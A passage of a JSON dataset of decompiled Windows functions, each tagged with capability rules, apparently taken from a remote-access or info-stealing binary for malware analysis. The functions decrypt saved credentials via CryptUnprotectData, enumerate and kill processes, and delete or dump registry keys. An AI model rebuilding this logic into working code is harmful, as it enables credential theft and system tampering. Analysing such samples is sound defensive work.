}\n                    else {\n                        for (puStack72 = NULL; puStack72 < puStack160; puStack72 = puStack72 + 1) {\n                            puStack1232 = puStack72 * 0x34 + iStack164;\n                            pcStack1224 = 0x10;\n                            pcStack1228 = &stack0xffffff6c;\n                            iStack84 = puStack1232;\n                            iVar1 = fcn.0041a53c();\n                            if (iVar1 == 0) {\n                                pcStack1224 = *(iStack84 + 0x10);\n                                uStack1204 = 0;\n                                pcStack1208 = NULL;\n                                puStack1212 = 0x100;\n                                pcStack1216 = &stack0xfffffe58;\n                                puStack1220 = 0xffffffff;\n                                pcStack1228 = NULL;\n                                puStack1232 = NULL;\n                                sub.KERNEL32.dll_WideCharToMultiByte();\n                                sub.KERNEL32.dll_WideCharToMultiByte\n                                          (0, 0, *(puStack116 + 0x14) + 0x20, 0xffffffff, &stack0xfffffd38, 0x100, 0, 0)\n                                ;\n                                sub.KERNEL32.dll_WideCharToMultiByte\n                                          (0, 0, *(iStack148 + 0x18) + 0x20, 0xffffffff, &stack0xfffffc18, 0x100, 0, 0);\n                                uStack264 = 0;\n                                iStack44 = (*pcStack200)(uStack252, iStack180, *(iStack180 + 0x14), *(iStack180 + 0x18)\n                                                         , 0, 0, &stack0xfffffef8);\n                                if (iStack44 == 0) {\n                                    iStack52 = iStack136;\n                                    pcStack1192 = *(iStack136 + 0x1c) + 0x20;\n                                    uStack1172 = 0;\n                                    uStack1176 = 0;\n                                    pcStack1180 = 0x100;\n                                    pcStack1184 = &stack0xfffffb78;\n                                    uStack1188 = 0xffffffff;\n                                    uStack1196 = 0;\n                                    puStack1232 = NULL;\n                                    uStack1204 = 0x414c83;\n                                    sub.KERNEL32.dll_WideCharToMultiByte();\n                                    puStack1212 = &stack0xfffffb58;\n                                    pcStack1216 = &stack0xfffffc58;\n                                    puStack1220 = &stack0xfffffd58;\n                                    pcStack1224 = 0x2;\n                                    pcStack1228 = \"%c%s\\a%s:%s\\b\\b\\b\\b\";\n                                    puStack1232 = &stack0xfffffb30;\n                                    puStack116 = fcn.00419f10();\n                                    if (puStack116 != 0xffffffff) {\n                                        pcStack1216 = 0x1;\n                                        pcStack1228 = pcStack68;\n                                        puStack1232 = &stack0xffffff68;\n                                        pcStack1224 = &stack0xfffffb30;\n                                        puStack1220 = puStack116;\n                                        iStack152 = fcn.0041a022();\n                                        pcStack68 = pcStack68 + puStack116;\n                                    }\n                                }\n                                if (iStack168 != 0) {\n                                    puStack1232 = iStack168;\n                                    (*pcStack112)();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        if (iStack164 != 0) {\n            puStack1232 = iStack164;\n            (*pcStack112)();\n        }\n        if (iStack156 != 0) {\n            puStack1232 = &stack0xffffff64;\n            (*pcStack96)();\n        }\n        if (iStack80 != 0) {\n            puStack1232 = iStack80;\n            sub.KERNEL32.dll_FreeLibrary();\n        }\n        *ppcStack48 = pcStack68;\n    }\n    return iStack152;\n}\n",
        "token_count": 3210
    },
    "00415034": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00415034(uint param_1, int32_t param_2, uint *param_3)\n\n{\n    int32_t iVar1;\n    int32_t iStack2140;\n    int32_t iStack2136;\n    uchar auStack2124 [4];\n    uint uStack2120;\n    char acStack2116 [4];\n    uint uStack2112;\n    uint uStack2108;\n    uint32_t uStack2104;\n    int32_t iStack2100;\n    uint uStack2096;\n    uint uStack2092;\n    uchar auStack2088 [992];\n    uchar auStack1096 [4];\n    char acStack1092 [28];\n    uchar auStack1064 [1000];\n    int32_t iStack64;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uint32_t uStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    uint uStack16;\n    \n    iStack40 = 0;\n    uStack2092 = 0;\n    iStack32 = fcn.00414f74(param_2, &iStack40);\n    iStack20 = param_2 + iStack40;\n    iStack32 = iStack32 + -1;\n    uStack36 = 0;\n    uStack16 = 0;\n    fcn.0041a59f(auStack2088, 0, 0x400);\n    fcn.0041a59f(auStack1064, 0, 0x400);\n    uStack2096 = 0;\n    uStack2112 = 0;\n    uStack2108 = 0;\n    param_2 = iStack20 + iStack32;\n    for (iStack24 = 0; iStack24 <= iStack32; iStack24 = iStack24 + iStack40) {\n        uStack28 = fcn.00414f74(iStack20, &iStack40);\n        iStack20 = iStack20 + iStack40;\n        if (((0xb < uStack28) && ((uStack28 & 1) == 0)) && (uStack28 = uStack28 - 0xc >> 1,  iStack24 == 5)) {\n            iStack2100 = param_2;\n            uStack2104 = uStack28;\n            iVar1 = sub.CRYPT32.DLL_CryptUnprotectData(&uStack2104, 0, 0, 0, 0, 0, &uStack2112);\n            if (iVar1 != 0) {\n                if (((iStack2140 != 0) && (acStack2116[0] != '\\0')) && (acStack1092[0] != '\\0')) {\n                    *(iStack2140 + iStack2136) = 0;\n                    iStack64 = fcn.00419f10(auStack2124, \"%c%s\\a%s\\a%s\\b\\b\\b\\b\", iStack24, acStack1092, acStack2116, \n                                            iStack2136);\n                    if (iStack64 != -1) {\n                        uStack2120 = fcn.0041a022(&uStack2120, iStack44, auStack2124, iStack64, 1);\n                        iStack44 = iStack44 + iStack64;\n                    }\n                }\n                sub.KERNEL32.dll_LocalFree(iStack2136);\n            }\n            fcn.0041a59f(&uStack2120, 0, 0x400);\n            fcn.0041a59f(auStack1096, 0, 0x400);\n        }\n        if ((0xc < uStack28) && ((uStack28 & 1) != 0)) {\n            uStack28 = uStack28 - 0xd >> 1;\n            if (iStack24 == 1) {\n                fcn.00419918(auStack1064, param_2, uStack28 + 1);\n            }\n            else if (iStack24 == 3) {\n                fcn.00419918(auStack2088, param_2, uStack28 + 1);\n            }\n        }\n        param_2 = param_2 + uStack28;\n    }\n    *param_3 = uStack16;\n    return uStack2092;\n}\n",
        "token_count": 961
    },
    "00415cf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00415cf0(uint param_1, uchar param_2, char param_3)\n\n{\n    uint uStack24;\n    uint uStack20;\n    int32_t iStack16;\n    \n    iStack16 = 0;\n    if (param_3 == '\\x01') {\n        iStack16 = fcn.00411da2();\n    }\n    else if (param_3 == '\\x02') {\n        iStack16 = fcn.00411b6c();\n    }\n    else {\n        uStack20 = fcn.00411da2();\n        uStack24 = fcn.00411b6c();\n        iStack16 = fcn.0041a022(&uStack20, 0xffffffff, &uStack24, 0xffffffff, 1);\n    }\n    fcn.00408b8f(param_1, param_2, iStack16, 0xffffffff);\n    if (iStack16 != 0) {\n        sub.msvcrt.dll_free(iStack16);\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "00415db3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00415db3(uint param_1, uchar param_2, char param_3)\n\n{\n    uint uStack24;\n    int32_t iStack20;\n    uint uStack16;\n    \n    iStack20 = 0;\n    if (param_3 == '\\x01') {\n        iStack20 = fcn.00412f27();\n    }\n    else if (param_3 == '\\x02') {\n        iStack20 = fcn.00410aa1(2);\n    }\n    else {\n        iStack20 = fcn.00410aa1(2);\n        uStack24 = fcn.00412f27();\n        iStack20 = fcn.0041a022(&iStack20, 0xffffffff, &uStack24, 0xffffffff, 1);\n    }\n    uStack16 = 0;\n    if (iStack20 != 0) {\n        uStack16 = sub.msvcrt.dll_strlen(iStack20);\n    }\n    fcn.00408b8f(param_1, param_2, iStack20, uStack16);\n    if (iStack20 != 0) {\n        fcn.0040b4bf(&iStack20);\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "00415ea4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00415ea4(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t iStack1492;\n    uchar *puStack1488;\n    uint uStack1484;\n    uint uStack1480;\n    ushort uStack1460;\n    ushort uStack1458;\n    ushort uStack1454;\n    ushort uStack1452;\n    uint16_t uStack1450;\n    uint16_t uStack1448;\n    int32_t iStack1428;\n    uint uStack1420;\n    uchar auStack1416 [8];\n    uchar auStack1408 [16];\n    uchar auStack1392 [12];\n    uint uStack1380;\n    uchar auStack1132 [28];\n    uchar auStack1104 [488];\n    uchar auStack616 [504];\n    uchar auStack112 [8];\n    int32_t iStack104;\n    uchar auStack100 [16];\n    int32_t iStack84;\n    uint32_t uStack80;\n    int32_t iStack76;\n    uint uStack64;\n    uchar auStack60 [4];\n    uint32_t uStack56;\n    code *pcStack44;\n    uint uStack40;\n    int32_t iStack32;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack20 = 0;\n    uStack1480 = 0;\n    uStack1484 = 2;\n    puStack1488 = 0x415ecc;\n    iStack1492 = sub.KERNEL32.dll_CreateToolhelp32Snapshot();\n    iStack32 = iStack1492;\n    if (iStack1492 == -1) {\n        uStack1480 = 0;\n        uStack1484 = 0;\n        puStack1488 = 0xbf;\n        fcn.00408b8f();\n    }\n    else {\n        uStack1380 = 0x128;\n        puStack1488 = &stack0xfffffa9c;\n        iVar2 = sub.KERNEL32.dll_Process32First();\n        if (iVar2 == 0) {\n            sub.KERNEL32.dll_CloseHandle(uStack40);\n            iStack1492 = 0;\n            fcn.00408b8f(uStack16, 0xbf, 0);\n        }\n        else {\n            fcn.004195d4(&stack0xffffffc4, 0x8000);\n            uVar3 = fcn.0040b60e(\"Ed5FWSQid_4idLCldjfD\");\n            uVar4 = fcn.0040b4e9(\"psapi.dll\");\n            iStack32 = fcn.0040b4ff(uVar4, uVar3);\n            if (iStack32 == 0) {\n                uVar3 = fcn.0040b60e(\"Ed5FWSQid_4idLCldjfD\");\n                uVar4 = fcn.0040b4e9(0x4201ab);\n                iStack32 = fcn.0040b4ff(uVar4, uVar3);\n            }\n            do {\n                iStack1492 = uStack1380;\n                uStack56 = sub.KERNEL32.dll_OpenProcess(0x410, 0);\n                if ((uStack56 == 0) || (pcStack44 == NULL)) {\n                    fcn.00419918(&stack0xfffffbb0, 0x4201b8, 0x204);\n                }\n                else {\n                    iVar2 = (*pcStack44)(uStack56, 0, &stack0xfffffbb0, 0x204);\n                    if (iVar2 == 0) {\n                        fcn.00419918(&stack0xfffffbb0, 0x4201b8, 0x204);\n                    }\n                }\n                puVar6 = &stack0xfffffa80;\n                uVar5 = uStack56;\n                iVar2 = sub.KERNEL32.dll_GetProcessTimes\n                                  (uStack56, puVar6, &stack0xfffffa78, &stack0xfffffa78, &stack0xfffffa78);\n                if ((iVar2 == 0) || (iStack1428 == 0)) {\n                    uVar1 = 0;\n                }\n                else {\n                    uVar1 = 1;\n                }\n                uStack80 = uStack80 & 0xffffff | uVar1 << 0x18;\n                if (uVar1 == 0) {\n                    fcn.00419918(&stack0xfffffa34, 0x4201b8, 0x20);\n                }\n                else {\n                    sub.KERNEL32.dll_FileTimeToSystemTime(&stack0xfffffa6c, &stack0xfffffa54);\n                    puVar6 = uStack1448;\n                    uVar5 = uStack1450;\n                    fcn.00419fa8(&stack0xfffffa2c, 0x20, \"%.2d/%.2d/%d %.2d:%.2d:%.2d\", uStack1454, uStack1458, \n                                 uStack1460, uStack1452, uVar5, puVar6);\n                }\n                if (iStack84 != 0) {\n                    sub.KERNEL32.dll_CloseHandle(iStack84);\n                }\n                iStack76 = fcn.00419fa8(&stack0xfffffd98, 0x204, \"%s\\a%d\\a%s\\a%s\\a\", &stack0xfffffa90, uStack1420, \n                                        &stack0xfffffb94, &stack0xfffffa2c, uVar5, puVar6);\n                if (0 < iStack76) {\n                    fcn.0041972e(&stack0xffffff9c, &stack0xfffffd98, iStack76);\n                }\n                iVar2 = sub.KERNEL32.dll_Process32Next(uStack80, &stack0xfffffa6c);\n            } while (iVar2 != 0);\n            sub.KERNEL32.dll_CloseHandle();\n            if (iStack104 == 0) {\n                fcn.00408b8f(uStack64);\n            }\n            else {\n                fcn.00419910(&stack0xffffff90);\n                fcn.00408b8f(uStack64);\n            }\n            fcn.00419639(&stack0xffffff90);\n        }\n    }\n    return;\n}\n",
        "token_count": 1402
    },
    "004162f6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar fcn.004162f6(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar1 = fcn.00419d08(param_1);\n    uVar3 = 0;\n    iVar2 = sub.KERNEL32.dll_OpenProcess(1, 0, uVar1);\n    if (iVar2 != 0) {\n        sub.KERNEL32.dll_TerminateProcess(iVar2, 0);\n        sub.KERNEL32.dll_CloseHandle(uVar3);\n    }\n    return uVar3 >> 0x18;\n}\n",
        "token_count": 133
    },
    "00416dc5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00416dc5(uint param_1, char *param_2, uint param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puStack664;\n    uint uStack660;\n    uchar *puStack656;\n    uchar *puStack652;\n    uint uStack648;\n    uint uStack644;\n    uchar *puStack640;\n    uchar *puStack636;\n    uchar *puStack632;\n    uchar *puStack628;\n    char *pcStack624;\n    uint uStack620;\n    uchar auStack608 [4];\n    uchar auStack604 [8];\n    uchar auStack596 [456];\n    uchar auStack140 [32];\n    int32_t iStack108;\n    int32_t iStack76;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack44;\n    int32_t iStack24;\n    uint uStack4;\n    \n    if (*param_2 == '\\0') {\n        puStack628 = 0x204;\n        puStack632 = param_3;\n        puStack636 = &stack0xfffffdac;\n        puStack640 = 0x416e2c;\n        fcn.00419918();\n    }\n    else {\n        uStack620 = param_3;\n        pcStack624 = param_2;\n        puStack628 = 0x4201e4;\n        puStack632 = 0x204;\n        puStack636 = &stack0xfffffdac;\n        puStack640 = 0x416e0b;\n        fcn.00419fa8();\n    }\n    puStack632 = &stack0xfffffdac;\n    puStack636 = param_1;\n    puStack640 = 0x416e43;\n    iStack24 = sub.ADVAPI32.DLL_RegDeleteKeyA();\n    if (iStack24 == 0) {\n        uVar2 = 1;\n    }\n    else {\n        puStack628 = &stack0xfffffda0;\n        puStack632 = 0x108;\n        puStack636 = NULL;\n        puStack640 = &stack0xfffffda4;\n        uStack644 = uStack4;\n        uStack648 = 0x416e90;\n        iStack44 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iStack44 == 0) {\n            puStack632 = 0x40;\n            puStack636 = NULL;\n            puStack640 = NULL;\n            uStack644 = 0;\n            uStack648 = 0;\n            puStack652 = &stack0xfffffd88;\n            puStack656 = &stack0xffffff94;\n            uStack660 = 0;\n            puStack664 = puStack628;\n            iStack76 = sub.ADVAPI32.DLL_RegEnumKeyExA();\n            iVar3 = iStack76;\n            while ((iVar3 == 0 && (cVar1 = fcn.00416dc5(uStack56, &stack0xfffffd70, &stack0xffffff74),  cVar1 == '\\x01')\n                   )) {\n                puStack664 = 0x40;\n                iStack108 = sub.ADVAPI32.DLL_RegEnumKeyExA(uStack660, 0, &stack0xffffff74, &stack0xfffffd68, 0, 0, 0, 0)\n                ;\n                iVar3 = iStack108;\n            }\n            sub.ADVAPI32.DLL_RegCloseKey(uStack660);\n            iVar3 = sub.ADVAPI32.DLL_RegDeleteKeyA(uStack60, &stack0xfffffd6c);\n            if (iVar3 == 0) {\n                uVar2 = 1;\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else if (iStack44 == 2) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 868
    },
    "00417009": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00417009(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uchar *puStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uchar auStack112 [32];\n    uint uStack80;\n    uint uStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar auStack24 [8];\n    uint uStack16;\n    \n    uStack16 = 0;\n    puStack172 = &stack0xffffffe8;\n    uStack176 = 0x108;\n    uStack180 = 0;\n    uStack184 = param_2;\n    uStack188 = param_1;\n    uStack192 = 0x41704f;\n    iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack48 = 0x40;\n        while( true ) {\n            uStack180 = 0;\n            uStack184 = 0;\n            uStack188 = 0;\n            uStack192 = 0;\n            puStack196 = &stack0xffffffd0;\n            puStack200 = &stack0xffffff90;\n            uStack204 = uStack36;\n            puStack208 = uStack44;\n            iVar1 = sub.ADVAPI32.DLL_RegEnumKeyExA();\n            if (iVar1 == 0x103) break;\n            iStack68 = iStack68 + 1;\n            puStack208 = &stack0xffffff30;\n            iStack72 = fcn.00419fa8();\n            if (0 < iStack72) {\n                puStack208 = uStack40;\n                fcn.0041972e();\n            }\n            uStack80 = 0x40;\n        }\n        puStack208 = uStack76;\n        sub.ADVAPI32.DLL_RegCloseKey();\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 514
    },
    "00417151": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00417151(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uchar auStack28 [16];\n    uint uStack12;\n    \n    uStack12 = 0x41715d;\n    iVar1 = fcn.0041ce38();\n    iVar1 = -iVar1;\n    *(&stack0x000020b0 + iVar1) = 0;\n    *(&stack0x00000054 + iVar1) = 0x1000;\n    *(&stack0x00000008 + iVar1) = &stack0x00002098 + iVar1;\n    *(&stack0x00000004 + iVar1) = 0x101;\n    *(&stack0x00000000 + iVar1) = 0;\n    *(&stack0xfffffffc + iVar1) = *(&stack0x000020cc + iVar1);\n    *(&stack0xfffffff8 + iVar1) = *(&stack0x000020c8 + iVar1);\n    *(&stack0xfffffff4 + iVar1) = 0x4171a7;\n    iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    puVar5 = &stack0xffffffe4 + iVar1;\n    if (iVar2 == 0) {\n        while( true ) {\n            puVar5[7] = 0;\n            puVar5[6] = 0;\n            puVar5[5] = puVar5 + 0x15;\n            puVar5[4] = 0;\n            puVar5[3] = puVar5 + 0x17;\n            puVar5[2] = puVar5 + 0x418;\n            puVar5[1] = puVar5[0x82e];\n            *puVar5 = puVar5[0x828];\n            puVar5[-1] = 0x4176ae;\n            iVar1 = sub.ADVAPI32.DLL_RegEnumValueA();\n            if (iVar1 == 0x103) break;\n            puVar5[0x826] = puVar5[0x826] + 1;\n            puVar4 = puVar5 + -8;\n    // switch table (12 cases) at 0x420228\n            switch(puVar5[0xd]) {\n            case 0:\n            case 3:\n                puVar5[-3] = puVar5 + 0xf;\n                puVar5[-4] = 0;\n                puVar5[-5] = 0;\n                puVar5[-6] = 0;\n                puVar5[-7] = puVar5 + 0x410;\n                puVar5[-8] = puVar5[0x820];\n                puVar5[-9] = 0x4174f4;\n                iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                puVar4 = puVar5 + -0xe;\n                if (iVar1 == 0) {\n                    puVar5[-0xd] = 1;\n                    puVar5[-0xe] = puVar5[9];\n                    puVar5[-0xf] = 0x417513;\n                    uVar3 = sub.msvcrt.dll_calloc();\n                    puVar5[3] = uVar3;\n                    puVar4 = puVar5 + -0xe;\n                    if (puVar5[3] != 0) {\n                        puVar5[-9] = puVar5 + 9;\n                        puVar5[-10] = puVar5[3];\n                        puVar5[-0xb] = puVar5 + 9;\n                        puVar5[-0xc] = 0;\n                        puVar5[-0xd] = puVar5 + 0x40a;\n                        puVar5[-0xe] = puVar5[0x81a];\n                        puVar5[-0xf] = 0x41755d;\n                        iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                        puVar4 = puVar5 + -0x14;\n                        if (iVar1 == 0) {\n                            puVar5[-4] = 0x420224;\n                            puVar5[-5] = 0;\n                            *(puVar5 + 0x2067) = 0;\n                            if (puVar5[3] != 0) {\n                                puVar5[-0x13] = puVar5[3];\n                                puVar5[-0x14] = puVar5[-3];\n                                puVar5[-0x15] = 0x41759e;\n                                uVar3 = fcn.0041ad97();\n                                puVar5[-4] = uVar3;\n                                *(puVar5 + 0x2067) = puVar5[-4] != 0;\n                            }\n                            puVar5[-0x10] = puVar5[-4];\n                            puVar5[-0x11] = puVar5[1];\n                            puVar5[-0x12] = puVar5 + 0x404;\n                            puVar5[-0x13] = \"%s\\a%d\\a%s\\a\";\n                            puVar5[-0x14] = puVar5 + -5;\n                            puVar5[-0x15] = 0x4175e1;\n                            uVar3 = fcn.00419f10();\n                            puVar5[0x815] = uVar3;\n                            if ((0 < puVar5[0x815]) && (puVar5[-5] != 0)) {\n                                puVar5[-0x12] = puVar5[0x815];\n                                puVar5[-0x13] = puVar5[-5];\n                                puVar5[-0x14] = puVar5[0x822];\n                                puVar5[-0x15] = 0x41761c;\n                                fcn.0041972e();\n                                puVar5[-0x14] = puVar5 + -5;\n                                puVar5[-0x15] = 0x417628;\n                                fcn.0040b4bf();\n                            }\n                            if (*(puVar5 + 0x2067) != '\\0') {\n                                puVar5[-0x14] = puVar5 + -4;\n                                puVar5[-0x15] = 0x41763e;\n                                fcn.0040b4bf();\n                            }\n                        }\n                        puVar5[-0x14] = puVar5 + -3;\n                        puVar5[-0x15] = 0x41764a;\n                        fcn.0040b4bf();\n                    }\n                }\n                break;\n            case 1:\n            case 2:\n            case 7:\n                puVar5[0xf] = 0x1000;\n                puVar5[-6] = 0x1000;\n                puVar5[-7] = 0;\n                puVar5[-8] = puVar5 + 0x420;\n                puVar5[-9] = 0x4171fc;\n                fcn.0041a59f();\n                puVar5[-3] = puVar5 + 0xf;\n                puVar5[-4] = puVar5 + 0x420;\n                puVar5[-5] = 0;\n                puVar5[-6] = 0;\n                puVar5[-7] = puVar5 + 0x410;\n                puVar5[-8] = puVar5[0x820];\n                puVar5[-9] = 0x417239;\n                iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                puVar4 = puVar5 + -0xe;\n                if (iVar1 == 0) {\n                    if ((puVar5[7] == 7) && (puVar5[9] != 0)) {\n                        puVar5[0x821] = 0;\n                        while (puVar5[0x821] <= puVar5[9] - 1 && puVar5[9] - 1 != puVar5[0x821]) {\n                            if (*(puVar5 + puVar5[0x821] + 0x1068) == '\\0') {\n                                *(puVar5 + puVar5[0x821] + 0x1068) = 8;\n                            }\n                            puVar5[0x821] = puVar5[0x821] + 1;\n                        }\n                    }\n                    puVar5[-9] = puVar5 + 0x41a;\n                    puVar5[-10] = puVar5[7];\n                    puVar5[-0xb] = puVar5 + 0x40a;\n                    puVar5[-0xc] = \"%s\\a%d\\a%s\\a\";\n                    puVar5[-0xd] = 0x1000;\n                    puVar5[-0xe] = puVar5 + 10;\n                    puVar5[-0xf] = 0x4172de;\n                    uVar3 = fcn.00419fa8();\n                    puVar5[0x81e] = uVar3;\n                    puVar4 = puVar5 + -0xe;\n                    if (0 < puVar5[0x81e]) {\n                        puVar5[-0xc] = puVar5[0x81e];\n                        puVar5[-0xd] = puVar5 + 10;\n                        puVar5[-0xe] = puVar5[0x828];\n                        puVar5[-0xf] = 0x417315;\n                        fcn.0041972e();\n                        puVar4 = puVar5 + -0xe;\n                    }\n                }\n                break;\n            case 4:\n                puVar5[0xf] = 4;\n                puVar5[-3] = puVar5 + 0xf;\n                puVar5[-4] = puVar5 + 0xe;\n                puVar5[-5] = 0;\n                puVar5[-6] = 0;\n                puVar5[-7] = puVar5 + 0x410;\n                puVar5[-8] = puVar5[0x820];\n                puVar5[-9] = 0x41735c;\n                iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                puVar4 = puVar5 + -0xe;\n                if (iVar1 == 0) {\n                    puVar5[-8] = puVar5[8];\n                    puVar5[-9] = puVar5[8];\n                    puVar5[-10] = puVar5[7];\n                    puVar5[-0xb] = puVar5 + 0x40a;\n                    puVar5[-0xc] = \"%s\\a%d\\a0x%.8X (%d)\\a\";\n                    puVar5[-0xd] = 0x1000;\n                    puVar5[-0xe] = puVar5 + 10;\n                    puVar5[-0xf] = 0x4173a6;\n                    uVar3 = fcn.00419fa8();\n                    puVar5[0x81d] = uVar3;\n                    puVar4 = puVar5 + -0xe;\n                    if (0 < puVar5[0x81d]) {\n                        puVar5[-0xc] = puVar5[0x81d];\n                        puVar5[-0xd] = puVar5 + 10;\n                        puVar5[-0xe] = puVar5[0x828];\n                        puVar5[-0xf] = 0x4173dd;\n                        fcn.0041972e();\n                        puVar4 = puVar5 + -0xe;\n                    }\n                }\n                break;\n            case 0xb:\n                puVar5[0xf] = 8;\n                puVar5[-3] = puVar5 + 0xf;\n                puVar5[-4] = puVar5 + 10;\n                puVar5[-5] = 0;\n                puVar5[-6] = 0;\n                puVar5[-7] = puVar5 + 0x410;\n                puVar5[-8] = puVar5[0x820];\n                puVar5[-9] = 0x417424;\n                iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                puVar4 = puVar5 + -0xe;\n                if (iVar1 == 0) {\n                    puVar5[-7] = puVar5[4];\n                    puVar5[-6] = puVar5[5];\n                    puVar5[-9] = puVar5[4];\n                    puVar5[-8] = puVar5[5];\n                    puVar5[-10] = puVar5[7];\n                    puVar5[-0xb] = puVar5 + 0x40a;\n                    puVar5[-0xc] = \"%s\\a%d\\a0x%.16llX (%I64d)\\a\";\n                    puVar5[-0xd] = 0x1000;\n                    puVar5[-0xe] = puVar5 + 10;\n                    puVar5[-0xf] = 0x41747e;\n                    uVar3 = fcn.00419fa8();\n                    puVar5[0x81c] = uVar3;\n                    puVar4 = puVar5 + -0xe;\n                    if (0 < puVar5[0x81c]) {\n                        puVar5[-0xc] = puVar5[0x81c];\n                        puVar5[-0xd] = puVar5 + 10;\n                        puVar5[-0xe] = puVar5[0x828];\n                        puVar5[-0xf] = 0x4174b5;\n                        fcn.0041972e();\n                        puVar4 = puVar5 + -0xe;\n                    }\n                }\n            }\n            *(puVar4 + 0x5c) = 0x1000;\n            puVar5 = puVar4;\n        }\n        puVar5[-8] = puVar5[0x820];\n        puVar5[-9] = 0x4176cb;\n        sub.ADVAPI32.DLL_RegCloseKey();\n        uVar3 = 1;\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 3186
    },
    "0041838c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00418402)\n// WARNING: Removing unreachable block (ram,0x0041841b)\n// WARNING: Removing unreachable block (ram,0x0041850c)\n// WARNING: Removing unreachable block (ram,0x00418522)\n// WARNING: Heritage AFTER dead removal. Example location: s0xfffffdb0 : 0x00418583\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.0041838c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *puStack624;\n    uint *puStack620;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    int32_t iStack592;\n    int32_t iStack588;\n    uchar auStack396 [24];\n    uchar auStack372 [36];\n    uint uStack336;\n    int32_t iStack332;\n    int32_t iStack328;\n    int32_t iStack148;\n    int32_t iStack144;\n    int32_t iStack140;\n    int32_t aiStack136 [2];\n    int32_t iStack128;\n    uint uStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    int32_t iStack76;\n    int32_t iStack72;\n    uint uStack56;\n    uint uStack52;\n    int32_t 